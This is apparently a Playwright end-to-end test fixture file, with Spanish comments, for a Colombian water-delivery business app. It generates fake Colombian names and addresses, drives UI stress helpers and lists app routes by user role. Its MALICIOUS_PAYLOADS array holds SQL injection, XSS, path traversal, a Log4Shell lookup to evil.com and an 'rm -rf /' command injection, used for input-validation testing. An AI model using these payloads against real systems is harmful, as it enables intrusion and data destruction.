/**
 * Destructive Walkthrough - Tier 8
 *
 * Combina:
 *  - @faker-js/faker@10.4.0 (randomization engine)
 *  - Pool de datos colombianos hardcodeados (faker no tiene locale es_CO)
 *  - Helpers destructivos (click all buttons, double-click, escape spam, etc.)
 *  - Matriz rol × viewport para tests parametrizados
 *
 * RE-EXPORTA helpers de ../00-fixtures.ts (qa-comprehensive) y ../walkthrough-helpers.ts
 * (exploratory) para reuso, sin duplicar.
 */
import { test as base, expect, type Page, type APIRequestContext } from '@playwright/test'
import { faker } from '@faker-js/faker'
import {
  login,
  loginAs as loginAsLegacy,
  skipBaseCaja,
  handleBaseCaja,
  fullLogin,
  apiGet,
  apiPost,
  apiPut,
  apiPatch,
  apiDelete,
  createCliente,
  createClienteFull,
  createPedido,
  createTrabajador,
  createEmbarque,
  createSellador,
  createProveedor,
  createInsumo,
  createNegocio,
  getFirstCliente,
  getFirstTrabajador,
  getSellador,
  getFirstFacturaConSaldo,
  setupClienteWithPedidos,
  clickButton,
  fillInput,
  selectOption,
  waitForToast,
  setMobileViewport,
  checkTouchTargets,
  checkHorizontalOverflow,
  goto,
  getUniqueFutureDate,
  BASE,
} from '../00-fixtures'
import {
  CREDENTIALS,
  skipBaseCaja as skipBaseCajaExploratory,
  addFinding as addFindingExploratory,
  getFindingsCount,
  isVisible as isVisibleExploratory,
  hasHorizontalOverflow,
  hasGarbageText,
  shoot as shootExploratory,
  SCREENSHOTS_DIR as EXPLORATORY_SCREENSHOTS_DIR,
  RUN_ID as EXPLORATORY_RUN_ID,
  FINDINGS_FILE as EXPLORATORY_FINDINGS_FILE,
  dbCount,
  dbQuery,
} from '../../exploratory/walkthrough-helpers'

// ─────────────────────────────────────────────────────────────────────────────
//  DATOS COLOMBIANOS (faker no tiene es_CO)
// ─────────────────────────────────────────────────────────────────────────────

const COLOMBIAN_FIRST_NAMES = [
  'Jhonnatan', 'Lilia', 'Kevin', 'Yesid', 'Romel', 'Edwin', 'Jose',
  'Juan Carlos', 'María Fernanda', 'Ana Lucía', 'Carlos Andrés',
  'Luz Marina', 'Pedro Antonio', 'Rosa Helena', 'Luis Eduardo',
  'Carmen Sofía', 'Jorge Hernán', 'Gladys Esperanza', 'Roberto Carlos',
  'Martha Lucía', 'Diego Fernando', 'Patricia Elena', 'Andrés Felipe',
  'Sandra Milena', 'Hernando de Jesús', 'Beatriz Helena',
  'Camilo Andrés', 'Ángela María', 'Wilson', 'Mónica', 'Fabio',
  'Esperanza', 'Orlando', 'Yolanda', 'Germán', 'Blanca Inés',
  'Francisco Javier', 'Marleny', 'Aldemar', 'Flor María', 'Jairo',
  'Stella', 'Leopoldo', 'Olga Lucía', 'Danilo', 'Consuelo',
  'Alfonso', 'Bertha', 'Octavio', 'Lucía', 'Rubén',
]

const COLOMBIAN_LAST_NAMES = [
  'Quispe', 'Castilla', 'Caballero', 'Ramírez', 'Torres', 'Vargas',
  'Mendoza', 'Pérez', 'García', 'Rodríguez', 'López', 'Martínez',
  'Hernández', 'González', 'Díaz', 'Moreno', 'Rojas', 'Castro',
  'Ortiz', 'Ruiz', 'Cardona', 'Henao', 'Giraldo', 'Salazar',
  'Quintero', 'Vanegas', 'Bedoya', 'Trujillo', 'Montoya',
  'Rivas', 'Pinzón', 'Cuéllar', 'Cifuentes', 'Zamora', 'Peña',
  'Córdoba', 'Cárdenas', 'Arias', 'Parra', 'Arango',
  'Calderón', 'Bermúdez', 'Escobar', 'Aguilar', 'Rengifo',
  'Ocampo', 'Ramos', 'Acuña', 'Mora', 'Sierra',
]

const BOGOTA_BARRIOS = [
  'Chapinero', 'Usaquén', 'Suba', 'Engativá', 'Fontibón',
  'Bosa', 'Kennedy', 'Teusaquillo', 'La Candelaria', 'San Cristóbal',
  'San José', 'Los Mártires', 'Santa Fe', 'Barrios Unidos',
  'Antonio Nariño', 'Puente Aranda', 'Rafael Uribe Uribe',
  'Ciudad Bolívar', 'Tunjuelito', 'Soacha Centro', 'Chía Centro',
  'Zipaquirá', 'Facatativá', 'Madrid (Cund.)', 'Mosquera', 'Funza',
  'Cajicá', 'Tabio', 'Tenjo', 'Cota', 'Girardot', 'Ibagué Centro',
]

const CALLE_VARIANTS = [
  'Calle', 'Carrera', 'Avenida', 'Transversal', 'Diagonal', 'Circular',
]

const NEGOCIO_TYPES = [
  'Tienda de barrio', 'Supermercado', 'Restaurante', 'Panadería',
  'Droguería', 'Cafetería', 'Frutería', 'Miscelánea', 'Estadero',
  'Peluquería', 'Salsamentaria', 'Heladería', 'Pizzería', 'Cevichería',
  'Asadero', 'Billar', 'Taberna', 'Boutique', 'Ferretería', 'Papelería',
]

const CIUDADES_COL = [
  'Bogotá D.C.', 'Soacha', 'Chía', 'Zipaquirá', 'Facatativá',
  'Madrid', 'Mosquera', 'Funza', 'Cajicá', 'Girardot',
  'Ibagué', 'Tunja', 'Manizales', 'Pereira', 'Armenia',
  'Villavicencio', 'Neiva', 'Popayán', 'Pasto', 'Bucaramanga',
]

const PHONE_PREFIXES = ['310', '311', '312', '313', '314', '315', '316', '317', '318', '319', '320', '321', '322', '323']

const PRODUCTOS_CODIGOS = [
  'PACA_AGUA', 'PACA_HIELO', 'BOTELLON', 'BOLSA_AGUA', 'BOLSA_HIELO',
] as const

const HORAS_DIA = [
  '06:00', '07:00', '08:00', '09:00', '10:00', '11:00', '12:00',
  '13:00', '14:00', '15:00', '16:00', '17:00', '18:00',
]

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS DE GENERACIÓN DE DATOS COLOMBIANOS
// ─────────────────────────────────────────────────────────────────────────────

/** Fija el seed de faker para reproducibilidad entre runs */
export function seedFaker(seed = 42): void {
  faker.seed(seed)
}

/** Nombre completo colombiano (3 palabras: nombre + apellido + apellido) */
export function randomNombre(): string {
  const first = faker.helpers.arrayElement(COLOMBIAN_FIRST_NAMES)
  const last1 = faker.helpers.arrayElement(COLOMBIAN_LAST_NAMES)
  const last2 = faker.helpers.arrayElement(COLOMBIAN_LAST_NAMES)
  return `${first} ${last1} ${last2}`
}

/** Primer nombre solo (para tests donde se necesita solo el nombre) */
export function randomNombreCorto(): string {
  return faker.helpers.arrayElement(COLOMBIAN_FIRST_NAMES)
}

/** Apellido solo */
export function randomApellido(): string {
  return `${faker.helpers.arrayElement(COLOMBIAN_LAST_NAMES)} ${faker.helpers.arrayElement(COLOMBIAN_LAST_NAMES)}`
}

/** NIT colombiano con formato "XX.XXX.XXX-X" */
export function randomNIT(): string {
  const digits = faker.string.numeric({ length: 9, exclude: ['0'] })
  return `${digits.slice(0, 2)}.${digits.slice(2, 5)}.${digits.slice(5, 8)}-${faker.number.int({ min: 1, max: 9 })}`
}

/** Cédula colombiana con formato "XX.XXX.XXX" */
export function randomCedula(): string {
  const digits = faker.string.numeric({ length: 8, exclude: ['0'] })
  return `${digits.slice(0, 2)}.${digits.slice(2, 5)}.${digits.slice(5)}`
}

/** Teléfono colombiano con formato "+57 3XX XXX XXXX" */
export function randomTelefono(): string {
  const prefix = faker.helpers.arrayElement(PHONE_PREFIXES)
  const rest = faker.string.numeric(7)
  return `+57 ${prefix} ${rest.slice(0, 3)} ${rest.slice(3)}`
}

/** Teléfono sin formato (solo dígitos) para inputs number */
export function randomTelefonoDigitos(): string {
  return `3${faker.string.numeric(9)}`
}

/** Dirección colombiana: "Calle 100 #15-20" o "Carrera 7 #32-16" */
export function randomDireccion(): string {
  const type = faker.helpers.arrayElement(CALLE_VARIANTS)
  const main = faker.number.int({ min: 1, max: 200 })
  const hash = faker.number.int({ min: 1, max: 99 })
  const sub = faker.number.int({ min: 1, max: 99 })
  return `${type} ${main} #${hash}-${sub}`
}

/** Dirección con barrio incluido: "Calle 100 #15-20, Chapinero" */
export function randomDireccionCompleta(): string {
  return `${randomDireccion()}, ${randomBarrio()}`
}

/** Barrio real de Bogotá/Cundinamarca */
export function randomBarrio(): string {
  return faker.helpers.arrayElement(BOGOTA_BARRIOS)
}

/** Ciudad colombiana */
export function randomCiudad(): string {
  return faker.helpers.arrayElement(CIUDADES_COL)
}

/** Tipo de negocio colombiano */
export function randomTipoNegocio(): string {
  return faker.helpers.arrayElement(NEGOCIO_TYPES)
}

/** Hora del día en formato HH:MM */
export function randomHora(): string {
  return faker.helpers.arrayElement(HORAS_DIA)
}

/** Cantidad realista (1-50 por default) */
export function randomCantidad(min = 1, max = 50): number {
  return faker.number.int({ min, max })
}

/** Precio en COP (sin formato) */
export function randomCOP(min: number, max: number): number {
  return faker.number.int({ min, max })
}

/** Precio formateado como COP colombiano: "$ 6.500,00" */
export function randomCOPFormatted(min: number, max: number): string {
  const n = randomCOP(min, max)
  return `$ ${n.toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
}

/** Email con dominio .com.co (colombiano) */
export function randomEmail(): string {
  const name = faker.internet.username().toLowerCase()
  return `${name}@aguabambu.com.co`
}

/** Comentario / nota en español (lorem con seed ES) */
export function randomComentario(min = 5, max = 15): string {
  return faker.lorem.sentence({ min, max })
}

/** Link de Google Maps (formato típico colombiano) */
export function randomLinkMaps(): string {
  const lat = faker.location.latitude({ min: 4.4, max: 4.8, precision: 6 })
  const lng = faker.location.longitude({ min: -74.3, max: -74.0, precision: 6 })
  return `https://maps.google.com/?q=${lat},${lng}`
}

/** URL web cualquiera */
export function randomURL(): string {
  return faker.internet.url()
}

/** Producto del catálogo (uno de los códigos válidos) */
export function randomProducto(): string {
  return faker.helpers.arrayElement([...PRODUCTOS_CODIGOS])
}

/** Fecha futura en formato ISO YYYY-MM-DD */
export function randomFechaFutura(daysAhead = 30): string {
  return faker.date.future({ years: 0, refDate: new Date(Date.now() + daysAhead * 86400000) })
    .toISOString().split('T')[0]
}

/** Fecha pasada en formato ISO YYYY-MM-DD */
export function randomFechaPasada(daysAgo = 30): string {
  return faker.date.past({ years: 0, refDate: new Date(Date.now() - daysAgo * 86400000) })
    .toISOString().split('T')[0]
}

/** Fecha aleatoria entre dos extremos (en formato ISO) */
export function randomFechaEnRango(desde: string, hasta: string): string {
  const desdeMs = new Date(desde).getTime()
  const hastaMs = new Date(hasta).getTime()
  const random = faker.number.int({ min: desdeMs, max: hastaMs })
  return new Date(random).toISOString().split('T')[0]
}

/** Genera un objeto cliente completo con datos colombianos */
export interface ClienteData {
  nombre: string
  telefono: string
  direccion: string
  barrio: string
  ciudad?: string
  tipoNegocio?: string
  notas?: string
  linkUbicacion?: string
  horaApertura?: string
  horaCierre?: string
}

export function randomClienteData(overrides: Partial<ClienteData> = {}): ClienteData {
  return {
    nombre: randomNombre(),
    telefono: randomTelefonoDigitos(),
    direccion: randomDireccion(),
    barrio: randomBarrio(),
    ciudad: randomCiudad(),
    tipoNegocio: randomTipoNegocio(),
    notas: randomComentario(3, 8),
    linkUbicacion: randomLinkMaps(),
    horaApertura: '08:00',
    horaCierre: '18:00',
    ...overrides,
  }
}

/** Genera un objeto pedido completo */
export interface PedidoData {
  clienteId: string
  canal: 'PUNTO' | 'DOMICILIO'
  ventaRapida: boolean
  items: Array<{ producto: string; cantidad: number; precioManual?: number }>
  pagos: Array<{ metodo: 'EFECTIVO' | 'TRANSFERENCIA' | 'CREDITO' | 'FIADO'; monto: number }>
  notas?: string
}

export function randomPedidoData(clienteId: string, overrides: Partial<PedidoData> = {}): PedidoData {
  const items = [
    {
      producto: faker.helpers.arrayElement(['PACA_AGUA', 'PACA_HIELO', 'BOTELLON']),
      cantidad: faker.number.int({ min: 1, max: 10 }),
    },
  ]
  return {
    clienteId,
    canal: faker.helpers.arrayElement(['PUNTO', 'DOMICILIO']) as 'PUNTO' | 'DOMICILIO',
    ventaRapida: faker.datatype.boolean(),
    items,
    pagos: [
      {
        metodo: faker.helpers.arrayElement(['EFECTIVO', 'TRANSFERENCIA', 'EFECTIVO']) as
          | 'EFECTIVO'
          | 'TRANSFERENCIA',
        monto: faker.number.int({ min: 5000, max: 50000 }),
      },
    ],
    notas: randomComentario(2, 5),
    ...overrides,
  }
}

/** Genera un objeto trabajador */
export interface TrabajadorData {
  nombre: string
  telefono: string
  rol: 'REPARTIDOR' | 'SELLADOR' | 'EMPACADOR' | 'ENTUBADOR' | 'ADMIN'
  tipoPago: 'FIJO' | 'COMISION' | 'MIXTO'
  usaMoto: boolean
  capacidadKg?: number
}

export function randomTrabajadorData(overrides: Partial<TrabajadorData> = {}): TrabajadorData {
  const rol = faker.helpers.arrayElement(['REPARTIDOR', 'SELLADOR', 'EMPACADOR', 'ENTUBADOR']) as
    | 'REPARTIDOR'
    | 'SELLADOR'
    | 'EMPACADOR'
    | 'ENTUBADOR'
  const tipoPago = faker.helpers.arrayElement(['FIJO', 'COMISION', 'MIXTO']) as 'FIJO' | 'COMISION' | 'MIXTO'
  return {
    nombre: randomNombre(),
    telefono: randomTelefonoDigitos(),
    rol,
    tipoPago,
    usaMoto: rol === 'REPARTIDOR' ? faker.datatype.boolean() : false,
    capacidadKg: rol === 'REPARTIDOR' ? faker.number.int({ min: 200, max: 800 }) : 0,
    ...overrides,
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS DESTRUCTIVOS (testear UI/UX)
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Enumeration de todos los elementos interactivos visibles en la página actual.
 * Retorna un objeto con listas categorizadas para inspección destructiva.
 */
export interface InteractiveElements {
  buttons: Array<{ text: string; enabled: boolean; visible: boolean }>
  links: Array<{ text: string; href: string | null; visible: boolean }>
  inputs: Array<{ type: string; name: string | null; placeholder: string | null; visible: boolean; value: string }>
  selects: Array<{ name: string | null; optionCount: number }>
  textareas: Array<{ name: string | null; value: string }>
  checkboxes: Array<{ name: string | null; checked: boolean }>
  radios: Array<{ name: string | null; value: string | null; checked: boolean }>
}

export async function enumerateInteractiveElements(page: Page): Promise<InteractiveElements> {
  const result: InteractiveElements = {
    buttons: [],
    links: [],
    inputs: [],
    selects: [],
    textareas: [],
    checkboxes: [],
    radios: [],
  }

  // Buttons
  const buttonHandles = await page.$$('button:visible')
  for (const btn of buttonHandles) {
    const text = (await btn.textContent().catch(() => ''))?.trim() ?? ''
    const enabled = await btn.isEnabled().catch(() => false)
    const visible = await btn.isVisible().catch(() => false)
    result.buttons.push({ text: text.slice(0, 60), enabled, visible })
  }

  // Links
  const linkHandles = await page.$$('a:visible')
  for (const link of linkHandles) {
    const text = (await link.textContent().catch(() => ''))?.trim() ?? ''
    const href = await link.getAttribute('href').catch(() => null)
    const visible = await link.isVisible().catch(() => false)
    result.links.push({ text: text.slice(0, 60), href, visible })
  }

  // Inputs
  const inputHandles = await page.$$('input:visible')
  for (const input of inputHandles) {
    const type = (await input.getAttribute('type').catch(() => null)) ?? 'text'
    const name = await input.getAttribute('name').catch(() => null)
    const placeholder = await input.getAttribute('placeholder').catch(() => null)
    const value = (await input.inputValue().catch(() => '')) ?? ''
    const visible = await input.isVisible().catch(() => false)
    result.inputs.push({ type, name, placeholder, visible, value })
    if (type === 'checkbox') {
      const checked = await input.isChecked().catch(() => false)
      result.checkboxes.push({ name, checked })
    }
    if (type === 'radio') {
      const value = await input.getAttribute('value').catch(() => null)
      const checked = await input.isChecked().catch(() => false)
      result.radios.push({ name, value, checked })
    }
  }

  // Selects
  const selectLocator = page.locator('select:visible')
  const selectCount = await selectLocator.count()
  for (let i = 0; i < selectCount; i++) {
    const sel = selectLocator.nth(i)
    const name = await sel.getAttribute('name').catch(() => null)
    const optionCount = await sel.locator('option').count().catch(() => 0)
    result.selects.push({ name, optionCount })
  }

  // Textareas
  const textareaHandles = await page.$$('textarea:visible')
  for (const ta of textareaHandles) {
    const name = await ta.getAttribute('name').catch(() => null)
    const value = (await ta.inputValue().catch(() => '')) ?? ''
    result.textareas.push({ name, value })
  }

  return result
}

/**
 * Spamea la tecla Escape N veces sobre la página actual.
 * Usar para testear que modales/dropdowns no rompen el navegador.
 */
export async function spamEscape(page: Page, count = 15): Promise<void> {
  for (let i = 0; i < count; i++) {
    await page.keyboard.press('Escape').catch(() => {})
    await page.waitForTimeout(50)
  }
}

/**
 * Doble-click en TODOS los botones submit visibles de un form.
 * Testea idempotencia: no debe crear duplicados.
 */
export async function doubleClickAllSubmitButtons(page: Page): Promise<number> {
  const submitButtons = page.locator('button[type="submit"]:visible')
  const count = await submitButtons.count()
  let clicksDone = 0
  for (let i = 0; i < count; i++) {
    const btn = submitButtons.nth(i)
    if (await btn.isEnabled().catch(() => false)) {
      try {
        await btn.dblclick({ timeout: 1000 })
        clicksDone++
        await page.waitForTimeout(100)
      } catch {
        // ignore
      }
    }
  }
  return clicksDone
}

/**
 * Doble-click en un botón submit específico.
 */
export async function doubleClickSubmit(page: Page, selector = 'button[type="submit"]'): Promise<boolean> {
  const btn = page.locator(selector).first()
  if (!(await btn.isVisible({ timeout: 1000 }).catch(() => false))) return false
  if (!(await btn.isEnabled().catch(() => false))) return false
  try {
    await btn.dblclick({ timeout: 1000 })
    return true
  } catch {
    return false
  }
}

/**
 * Click rápido (sin esperar) en todos los botones visibles que NO sean submit.
 * Útil para enumerar y testear que no rompen nada.
 */
export async function clickAllNonSubmitButtons(page: Page, maxClicks = 20): Promise<number> {
  const buttons = page.locator('button:visible:not([type="submit"])')
  const count = await buttons.count()
  let clicksDone = 0
  const limit = Math.min(count, maxClicks)
  for (let i = 0; i < limit; i++) {
    const btn = buttons.nth(i)
    if (await btn.isEnabled().catch(() => false)) {
      try {
        await btn.click({ timeout: 500, trial: false })
        clicksDone++
        await page.waitForTimeout(50)
        // Si se abrió un modal, cerrarlo
        await page.keyboard.press('Escape').catch(() => {})
        await page.waitForTimeout(50)
      } catch {
        // ignore
      }
    }
  }
  return clicksDone
}

/**
 * Pega un texto enorme (50KB) en el primer input de tipo search/texto visible.
 * Verifica que la UI no se congele.
 */
export async function pasteHugeText(page: Page, sizeKB = 50): Promise<boolean> {
  const hugeText = 'A'.repeat(sizeKB * 1024)
  const searchInput = page
    .locator('input[type="search"]:visible, input[placeholder*="buscar" i]:visible, input[placeholder*="Buscar" i]:visible')
    .first()
  if (!(await searchInput.isVisible({ timeout: 1000 }).catch(() => false))) return false
  try {
    await searchInput.fill(hugeText)
    await page.waitForTimeout(500)
    return true
  } catch {
    return false
  }
}

/**
 * Intenta inyectar payloads maliciosos en inputs visibles.
 * No destructivo: solo verifica que el server rechace o sanee.
 */
export const MALICIOUS_PAYLOADS = [
  "'; DROP TABLE \"User\"; --",
  '<script>alert("XSS")</script>',
  '../../../../etc/passwd',
  '${jndi:ldap://evil.com/a}',
  '"; rm -rf / #',
  "' OR '1'='1",
  '<img src=x onerror=alert(1)>',
  '{{7*7}}',
  'null',
  'undefined',
  'NaN',
  '-1',
  '0',
  '9999999999999999999999',
] as const

export async function tryMaliciousInput(page: Page, selector: string): Promise<{ payload: string; filled: boolean }> {
  const payload = faker.helpers.arrayElement([...MALICIOUS_PAYLOADS])
  const input = page.locator(selector).first()
  const filled = await input.isVisible({ timeout: 500 }).catch(() => false)
  if (filled) {
    try {
      await input.fill(payload)
    } catch {
      // ignore
    }
  }
  return { payload, filled }
}

/**
 * Spam F5 / reload N veces.
 */
export async function spamReload(page: Page, count = 5): Promise<void> {
  for (let i = 0; i < count; i++) {
    await page.reload({ waitUntil: 'domcontentloaded' }).catch(() => {})
    await page.waitForTimeout(200)
  }
}

/**
 * Navegación rápida entre varias páginas.
 * Verifica que la app no se rompa.
 */
export async function rapidNavigation(page: Page, paths: string[]): Promise<void> {
  for (const p of paths) {
    await page.goto(`${BASE}${p}`, { waitUntil: 'commit', timeout: 5000 }).catch(() => {})
    await page.waitForTimeout(150)
  }
}

/**
 * Resize de ventana mientras hay un modal abierto.
 */
export async function resizeWhileModalOpen(page: Page): Promise<void> {
  const modal = page.locator('[role="dialog"]:visible, .modal:visible, .fixed.inset-0:visible').first()
  if (!(await modal.isVisible({ timeout: 500 }).catch(() => false))) return
  const sizes = [
    { width: 1024, height: 768 },
    { width: 768, height: 1024 },
    { width: 375, height: 667 },
    { width: 1280, height: 720 },
  ]
  for (const size of sizes) {
    await page.setViewportSize(size).catch(() => {})
    await page.waitForTimeout(100)
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  ASERCIONES / UTILIDADES DE UI/UX
// ─────────────────────────────────────────────────────────────────────────────

/** Verifica que NO hay overflow horizontal */
export async function assertNoHorizontalOverflow(page: Page): Promise<{ overflow: boolean; scrollWidth: number; clientWidth: number }> {
  const dimensions = await page.evaluate(() => ({
    scrollWidth: document.documentElement.scrollWidth,
    clientWidth: document.documentElement.clientWidth,
  }))
  const overflow = dimensions.scrollWidth > dimensions.clientWidth + 2
  return { overflow, ...dimensions }
}

/** Verifica que no hay texto "basura" (undefined, null, NaN, [object Object]) */
export async function assertNoGarbageText(page: Page): Promise<{ garbage: string[] | null }> {
  const bodyText = (await page.locator('body').textContent().catch(() => '')) ?? ''
  const garbagePatterns = [/\bundefined\b/, /\bnull\b/, /\bNaN\b/, /\[object Object\]/]
  const matches: string[] = []
  for (const p of garbagePatterns) {
    const m = bodyText.match(p)
    if (m) matches.push(m[0])
  }
  return { garbage: matches.length > 0 ? matches : null }
}

/** Verifica que la página no tiene errores de Next.js */
export async function assertNoNextErrors(page: Page): Promise<{ hasError: boolean; snippet: string }> {
  const bodyText = (await page.locator('body').textContent().catch(() => '')) ?? ''
  const errorPatterns = [
    'Application error',
    'Internal Server Error',
    'Unhandled Runtime Error',
    'Error: 500',
    'TypeError:',
    'ReferenceError:',
    'is not a function',
  ]
  for (const pattern of errorPatterns) {
    if (bodyText.includes(pattern)) {
      return { hasError: true, snippet: bodyText.slice(0, 300) }
    }
  }
  return { hasError: false, snippet: '' }
}

/** Verifica que los touch targets tienen tamaño mínimo */
export async function assertTouchTargets(page: Page, minSize = 44): Promise<{ violations: string[] }> {
  const buttons = page.locator('button:visible, a:visible, [role="button"]:visible')
  const count = await buttons.count()
  const violations: string[] = []
  for (let i = 0; i < Math.min(count, 30); i++) {
    const box = await buttons.nth(i).boundingBox().catch(() => null)
    if (box && (box.width < minSize || box.height < minSize)) {
      const text = (await buttons.nth(i).textContent().catch(() => ''))?.trim().slice(0, 30) ?? ''
      violations.push(`"${text}": ${Math.round(box.width)}x${Math.round(box.height)}`)
    }
  }
  return { violations }
}

// ─────────────────────────────────────────────────────────────────────────────
//  MATRIZ DE COMBOS: rol × viewport
// ─────────────────────────────────────────────────────────────────────────────

export type TestRole = 'admin' | 'asistente' | 'contador' | 'repartidor'
export type TestViewport = 'desktop' | 'mobile'

export interface RoleViewportCombo {
  role: TestRole
  viewport: TestViewport
  label: string
}

export const ALL_COMBOS: RoleViewportCombo[] = [
  { role: 'admin', viewport: 'desktop', label: 'admin × desktop' },
  { role: 'admin', viewport: 'mobile', label: 'admin × mobile' },
  { role: 'asistente', viewport: 'desktop', label: 'asistente × desktop' },
  { role: 'asistente', viewport: 'mobile', label: 'asistente × mobile' },
  { role: 'contador', viewport: 'desktop', label: 'contador × desktop' },
  { role: 'contador', viewport: 'mobile', label: 'contador × mobile' },
  { role: 'repartidor', viewport: 'desktop', label: 'repartidor × desktop' },
  { role: 'repartidor', viewport: 'mobile', label: 'repartidor × mobile' },
]

export const ALL_ROLES: TestRole[] = ['admin', 'asistente', 'contador', 'repartidor']
export const ALL_VIEWPORTS: TestViewport[] = ['desktop', 'mobile']

/** Login con credenciales colombianas para el rol dado (helper destructivo) */
export async function loginAsRole(page: Page, role: TestRole): Promise<void> {
  const creds = CREDENTIALS[role]
  if (!creds) throw new Error(`Unknown role: ${role}`)
  await skipBaseCajaExploratory(page)
  await page.goto(`${BASE}/login`)
  await page.fill('input[placeholder="Ingrese usuario"]', creds.user)
  await page.fill('input[placeholder="Ingrese contraseña"]', creds.pass)
  await page.click('button[type="submit"]')
  await page.waitForURL(/.*\/(dashboard|repartidor|reportes)/, { timeout: 20000 })
}

/** Setea viewport desktop o mobile */
export async function setViewportFor(page: Page, viewport: TestViewport): Promise<void> {
  if (viewport === 'mobile') {
    await page.setViewportSize({ width: 390, height: 844 })
  } else {
    await page.setViewportSize({ width: 1280, height: 720 })
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  CONFIGURACIÓN DEL FIXTURE (extiende Playwright test)
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Fixture extendido que aplica la viewport correcta antes de cada test.
 * Uso: `const { page } = test.extend({ ... })` o usar `test` directamente
 * Si el spec ya usa Playwright projects (chromium + chromium-mobile), el viewport
 * viene del project. Esta función es para override programático.
 */
export const test = base.extend<{ combo: RoleViewportCombo }>({
  combo: [{ role: 'admin', viewport: 'desktop', label: 'admin × desktop' }, { option: true }],
})

// ─────────────────────────────────────────────────────────────────────────────
//  MÓDULOS / RUTAS
// ─────────────────────────────────────────────────────────────────────────────

export interface ModuleDef {
  name: string
  path: string
  /** Roles que tienen acceso (al menos para smoke) */
  accessibleBy: TestRole[]
  /** CTAs esperados (botones principales) */
  expectedCTAs: string[]
  /** Categoría para agrupación en el reporte */
  category: 'core' | 'operaciones' | 'admin' | 'reportes' | 'repartidor'
}

export const ALL_MODULES: ModuleDef[] = [
  // Core
  { name: 'Dashboard', path: '/dashboard', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: [], category: 'core' },
  { name: 'Clientes', path: '/clientes', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Crear', 'Buscar'], category: 'core' },
  { name: 'Pedidos', path: '/pedidos', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Venta', 'Crear'], category: 'core' },
  { name: 'Recurrentes', path: '/recurrentes', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Crear', 'Nueva'], category: 'core' },
  { name: 'Nuevo Recurrente', path: '/recurrentes/nuevo', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Guardar', 'Crear'], category: 'core' },

  // Operaciones
  { name: 'Embarques', path: '/embarques', accessibleBy: ['admin', 'asistente', 'contador', 'repartidor'], expectedCTAs: ['Crear', 'Nuevo'], category: 'operaciones' },
  { name: 'Producción', path: '/produccion', accessibleBy: ['admin', 'asistente'], expectedCTAs: ['Registrar', 'Crear'], category: 'operaciones' },
  { name: 'Rutas', path: '/rutas', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nueva', 'Crear'], category: 'operaciones' },
  { name: 'Nueva Ruta', path: '/rutas/nuevo', accessibleBy: ['admin', 'asistente'], expectedCTAs: ['Guardar'], category: 'operaciones' },
  { name: 'Análisis Rutas', path: '/rutas/analisis', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: [], category: 'operaciones' },
  { name: 'Trabajadores', path: '/trabajadores', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Nuevo', 'Crear'], category: 'operaciones' },
  { name: 'Nómina', path: '/nomina', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Calcular', 'Crear', 'Nuevo'], category: 'operaciones' },

  // Admin
  { name: 'Configuración', path: '/configuracion', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Guardar'], category: 'admin' },
  { name: 'Usuarios', path: '/admin/usuarios', accessibleBy: ['admin'], expectedCTAs: ['Nuevo', 'Crear'], category: 'admin' },
  { name: 'Mi Perfil', path: '/mi-perfil', accessibleBy: ['admin', 'asistente', 'contador', 'repartidor'], expectedCTAs: ['Guardar'], category: 'admin' },
  { name: 'Cambiar Contraseña', path: '/cambiar-contrasena', accessibleBy: ['admin', 'asistente', 'contador', 'repartidor'], expectedCTAs: ['Cambiar'], category: 'admin' },

  // Reportes
  { name: 'Reportes', path: '/reportes', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Forecast', path: '/reportes/forecast', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Salud Antifraude', path: '/reportes/salud-antifraude', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Facturas', path: '/facturas', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Resumen Facturas', path: '/resumen-facturas', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Deudas', path: '/deudas', accessibleBy: ['admin', 'contador'], expectedCTAs: [], category: 'reportes' },
  { name: 'Casos', path: '/casos', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Crear'], category: 'reportes' },
  { name: 'Sugerencias', path: '/sugerencias', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: [], category: 'reportes' },

  // Inventario / Compras
  { name: 'Compras', path: '/compras', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Nueva', 'Crear', 'Registrar'], category: 'operaciones' },
  { name: 'Gastos', path: '/gastos', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Nuevo', 'Crear', 'Registrar'], category: 'operaciones' },
  { name: 'Insumos', path: '/insumos', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Crear'], category: 'operaciones' },
  { name: 'Productos', path: '/productos', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Nuevo', 'Crear'], category: 'operaciones' },
  { name: 'Proveedores', path: '/proveedores', accessibleBy: ['admin', 'contador'], expectedCTAs: ['Nuevo', 'Crear'], category: 'operaciones' },

  // Repartidor
  { name: 'Repartidor', path: '/repartidor', accessibleBy: ['repartidor'], expectedCTAs: [], category: 'repartidor' },

  // Cierre
  { name: 'Cierre', path: '/cierre', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: ['Cerrar'], category: 'operaciones' },
  { name: 'Reporte Cierre', path: '/cierre/reporte', accessibleBy: ['admin', 'asistente', 'contador'], expectedCTAs: [], category: 'operaciones' },
]

